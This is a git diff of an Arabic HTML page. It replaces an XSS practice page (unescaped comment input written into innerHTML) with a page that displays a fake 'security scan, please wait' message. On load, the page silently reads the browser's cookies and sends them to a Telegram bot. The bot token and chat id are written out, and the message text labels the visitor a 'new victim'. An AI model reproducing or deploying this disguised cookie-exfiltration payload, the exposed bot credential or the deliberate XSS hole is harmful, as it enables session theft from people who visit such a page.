@@ -2,27 +2,34 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مختبر YOU الأمني</title>
-    <style>
-        body { background: #111; color: #eee; font-family: sans-serif; text-align: center; padding: 50px; }
-        textarea { width: 80%; background: #222; border: 1px solid #444; color: #0f0; padding: 10px; border-radius: 8px; }
-        button { background: #f00; color: #fff; padding: 10px 20px; border: none; cursor: pointer; margin-top: 10px; border-radius: 20px; }
-        #wall { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
-    </style>
+    <title>مختبر الاختراق الحقيقي - YOU</title>
 </head>
-<body>
-    <h2>ثغرة XSS - مشروع YOU 🛡️</h2>
-    <textarea id="msg" rows="4" placeholder="احقن الكود هنا..."></textarea><br>
-    <button onclick="post()">نشر التعليق</button>
-    <div id="wall"></div>
-<script>
-    // هذا السطر ضروري جداً.. هو "الهدف" اللي راح ينسرق
-    document.cookie = "User_Session=YOU_SECRET_GITHUB_2026; path=/";
+<body onload="hacked()">
+    <h1 style="color: white; background: #000; padding: 100px; text-align: center; font-family: sans-serif;">
+        جاري فحص الأمان... يرجى الانتظار 🛡️
+    </h1>
 
-    function post() {
-        let input = document.getElementById('msg').value;
-        document.getElementById('wall').innerHTML += "<div>" + input + "</div>";
-    }
-</script>
+    <script>
+        // 1. زرع كوكيز "الضحية" (هذا اللي راح ينسرق)
+        document.cookie = "User_Session=VICTIM_TOKEN_2026_REAL; path=/";
+
+        function hacked() {
+            // 2. سحب الكوكيز من ذاكرة المتصفح
+            var stolenData = document.cookie;
+            
+            // 3. معلومات البوت مالتك (التوكن والآيدي)
+            var token = "7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ";
+            var id = "6778604620";
+
+            // 4. إرسال البيانات فوراً وبصمت للتليجرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=🚨_تم_دخول_ضحية_جديدة_وسحب_بياناتها:_` + encodeURIComponent(stolenData))
+            .then(response => {
+                if(response.ok) {
+                    console.log("Success: Data sent to YOU's Telegram!");
+                }
+            })
+            .catch(err => console.error("Error:", err));
+        }
+    </script>
 </body>
 </html>
